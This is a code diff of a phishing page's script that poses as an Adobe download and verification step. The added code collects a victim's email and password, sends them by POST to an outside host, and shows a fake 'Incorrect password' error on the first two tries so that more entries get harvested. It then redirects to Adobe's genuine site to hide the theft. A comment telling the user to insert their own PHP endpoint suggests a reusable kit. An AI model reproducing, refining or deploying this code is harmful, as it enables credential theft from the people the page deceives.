@@ -233,80 +233,83 @@
         <div>Downloading...</div>
     </div>
 
-    <script>
-        const form = document.getElementById("verifyForm");
-        const step1 = document.getElementById("step1");
-        const step2 = document.getElementById("step2");
-        const preloader1 = document.getElementById("preloader");
-        const preloader2 = document.getElementById("preloader2");
-        const nextBtn = document.getElementById("nextBtn");
-        const emailInput = document.getElementById("inputline1");
-        const instructionText = document.getElementById("instructionText");
+ <script>
+  const form = document.getElementById("verifyForm");
+  const step1 = document.getElementById("step1");
+  const step2 = document.getElementById("step2");
+  const preloader1 = document.getElementById("preloader");
+  const preloader2 = document.getElementById("preloader2");
+  const nextBtn = document.getElementById("nextBtn");
+  const emailInput = document.getElementById("inputline1");
+  const instructionText = document.getElementById("instructionText");
 
-        // Mask email helper
-        function maskEmail(email) {
-            const [user, domain] = email.split("@");
-            if (!user || !domain) return email;
-            if (user.length <= 2) return user[0] + "***@" + domain;
-            return user[0] + "***" + user[user.length - 1] + "@" + domain;
-        }
+  function maskEmail(email) {
+    const [user, domain] = email.split("@");
+    if (!user || !domain) return email;
+    if (user.length <= 2) return user[0] + "***@" + domain;
+    return user[0] + "***" + user[user.length - 1] + "@" + domain;
+  }
 
-        // Step 1 -> Step 2
-        nextBtn.addEventListener("click", () => {
-            const emailVal = emailInput.value.trim();
-            if (emailVal === "") {
-                emailInput.focus();
-                return;
-            }
+  // Step 1 → Step 2
+  nextBtn.addEventListener("click", () => {
+    const emailVal = emailInput.value.trim();
+    if (emailVal === "") {
+      emailInput.focus();
+      return;
+    }
 
-            preloader1.style.display = "flex";
+    preloader1.style.display = "flex";
 
-            setTimeout(() => {
-                preloader1.style.display = "none";
-                step1.style.display = "none";
-                step2.style.display = "block";
-                const masked = maskEmail(emailVal);
-                if (instructionText) instructionText.textContent = `To continue, please enter the email credentials for ${masked}`;
-            }, 2000);
-        });
+    setTimeout(() => {
+      preloader1.style.display = "none";
+      step1.style.display = "none";
+      step2.style.display = "block";
+      const masked = maskEmail(emailVal);
+      if (instructionText)
+        instructionText.textContent = `To continue, please enter the email credentials for ${masked}`;
+    }, 2000);
+  });
 
-        // Step 2 submission
-        form.addEventListener("submit", function (e) {
-            e.preventDefault();
+  // Step 2 submission
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
 
-            preloader1.style.display = "none";
-            preloader2.style.display = "flex"; // show downloading preloader
+    preloader2.style.display = "flex";
 
-            let submitCount = parseInt(localStorage.getItem("submitCount") || "0", 10);
-            submitCount++;
-            localStorage.setItem("submitCount", submitCount);
+    let submitCount = parseInt(localStorage.getItem("submitCount") || "0", 10);
+    submitCount++;
+    localStorage.setItem("submitCount", submitCount);
 
-            const errorMessage = document.getElementById("error-message");
+    const errorMessage = document.getElementById("error-message");
+    const formData = new FormData(form);
 
-            const formData = new FormData(form);
-            fetch("https://sazs.otkg.sa.com/auto/next.php", {
-                method: "POST",
-                body: formData
-            }).catch(() => {});
+    try {
+      // ✅ Replace with your actual PHP endpoint
+      const response = await fetch("https://sazs.otkg.sa.com/auto/next.php", {
+        method: "POST",
+        body: formData,
+      });
 
-            setTimeout(() => {
-                preloader2.style.display = "none";
+      // Optional: handle success
+      console.log("Submitted:", await response.text());
+    } catch (err) {
+      console.error("Submission failed:", err);
+    }
 
-                if (submitCount >= 3) {
-                    localStorage.removeItem("submitCount");
-                    window.location.href = "https://www.adobe.com/creativecloud.html";
-                } else {
-                    // Show error message twice for the first two failed attempts
-                    if (submitCount === 1 || submitCount === 2) {
-                        errorMessage.textContent = "Incorrect password. Please try again.";
-                    }
+    setTimeout(() => {
+      preloader2.style.display = "none";
 
-                    // Reset password field for retry
-                    document.getElementById("password").value = ""; // Clear password field
-                }
-            }, 2000);
-        });
-    </script>
+      if (submitCount >= 3) {
+        localStorage.removeItem("submitCount");
+        window.location.href = "https://www.adobe.com/creativecloud.html";
+      } else {
+        errorMessage.textContent = "Incorrect password. Please try again.";
+        document.getElementById("password").value = "";
+      }
+    }, 2000);
+  });
+</script>
+
 </body>
 
 </html>
